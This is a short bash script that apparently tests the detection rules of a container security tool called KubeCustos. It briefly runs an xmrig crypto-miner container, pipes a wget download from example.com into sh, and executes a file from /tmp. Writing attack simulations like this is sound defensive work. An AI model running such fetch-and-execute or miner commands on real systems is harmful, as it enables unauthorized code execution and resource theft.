#!/bin/bash
echo "[*] KubeCustos Attack Simulation Script"

echo "[+] Testing Rule 1: Crypto Miner Detection (xmrig)"
# We run this in the background and kill it after a few seconds.
docker run --rm -d --name miner alpine/xmrig >/dev/null 2>&1
sleep 5
docker kill miner >/dev/null 2>&1
echo "[+] Test complete."
sleep 1

echo "[+] Testing Rule 2: Supply Chain Attack (wget | sh)"
docker run --rm busybox sh -c "wget -O - example.com | sh" >/dev/null 2>&1
echo "[+] Test complete."
sleep 1

echo "[+] Testing Rule 3: Execution from /tmp"
docker run --rm busybox sh -c "touch /tmp/malware && chmod +x /tmp/malware && /tmp/malware"
echo "[+] Test complete."

echo "[*] Simulation finished."